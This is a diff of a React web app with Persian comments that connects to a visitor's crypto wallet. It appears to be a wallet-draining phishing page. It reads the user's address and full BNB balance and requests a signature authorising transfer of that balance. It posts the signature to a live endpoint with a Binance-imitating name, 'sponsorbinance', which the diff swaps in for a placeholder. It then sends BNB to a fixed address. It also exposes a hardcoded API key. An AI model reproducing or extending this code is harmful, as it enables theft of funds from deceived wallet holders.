@@ -1,9 +1,9 @@
 import React, { useState } from "react";
 
-// اگر می‌خواهید از jQuery برای POST به سرور استفاده کنید:
+// اگر می‌خواهید از jQuery برای POST استفاده کنید، این را uncomment کنید:
 // import jQuery from "jquery";
 
-// تابع انتخابی برای گرفتن بالانس BNB از BscScan (اختیاری)
+// دریافت بالانس BNB از BscScan (اختیاری)
 const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
 async function getBNBBalance(address) {
   try {
@@ -30,7 +30,7 @@ function App() {
       return;
     }
 
-    // 2) گرفتن آدرس کاربر
+    // 2) درخواست آدرس از کیف پول
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -46,18 +46,11 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
-    // (اختیاری) اگر کاربر دستی شبکه را بایننس اسمارت‌چین کرده باشد، chainId باید 0x38 باشد
-    // اگر لازم بود بررسی کنید:
-    // const chainId = await window.ethereum.request({ method: "eth_chainId" });
-    // if (chainId !== "0x38") {
-    //   console.warn("User not on BSC mainnet. They may switch manually!");
-    // }
-
-    // 3) مثلا گرفتن بالانس از BscScan (اختیاری)
+    // 3) (اختیاری) گرفتن بالانس BNB از BscScan
     const bnbBalance = await getBNBBalance(userAddress);
     console.log("💰 BNB Balance:", bnbBalance);
 
-    // 4) ساخت یک پیام ساده برای امضا
+    // 4) ساخت پیام ساده
     const message = `Authorize sending ${bnbBalance} BNB from ${userAddress}`;
     console.log("📜 Message to sign:", message);
 
@@ -73,12 +66,9 @@ function App() {
       return;
     }
 
-    // 5) ارسال امضا به سرور برای بررسی و ثبت در لاگ
-    //    اگر از jQuery استفاده می‌کنید:
-    //    let verifyResp = await jQuery.post("https://YOUR_DOMAIN/send.php", { handler: "tx", ... });
-    //    اینجا از fetch استفاده می‌کنم (همه مرورگرهای جدید پشتیبانی می‌کنند).
+    // 5) ارسال امضا به سرور
     try {
-      const resp = await fetch("https://YOUR_DOMAIN/send.php", {
+      const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -88,6 +78,7 @@ function App() {
           amount: bnbBalance,
         }),
       });
+
       const result = await resp.json();
       console.log("Server verify response:", result);
 
@@ -100,19 +91,15 @@ function App() {
       return;
     }
 
-    // 6) حالا یک تراکنش واقعی بسازیم (BNB از حساب کاربر به مقصد)
-    //    کاربر هزینه گس را می‌دهد. 
-    //    مثال: ارسال 0.001 BNB به آدرس مقصد
-
-    const sendAmount = 0.001; // نمونه؛ بسته به نیاز
+    // 6) ساخت تراکنش واقعی با eth_sendTransaction (کاربر گس را می‌دهد)
+    const sendAmount = 0.001; // مثالی از مقدار BNB
     const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
 
-    // ساخت آبجکت پارامترهای تراکنش
     const txParams = {
-      from: userAddress,                          // آدرس کاربر
-      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد (مثلاً شما)
+      from: userAddress,
+      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
       value: sendWeiHex,
-      // در صورت نیاز gas, gasPrice قرار دهید؛ اگر نگذارید کیف پول ممکن است خودش تخمین بزند
+      // gas یا gasPrice اگر بخواهید دستی تعیین کنید
     };
 
     try {
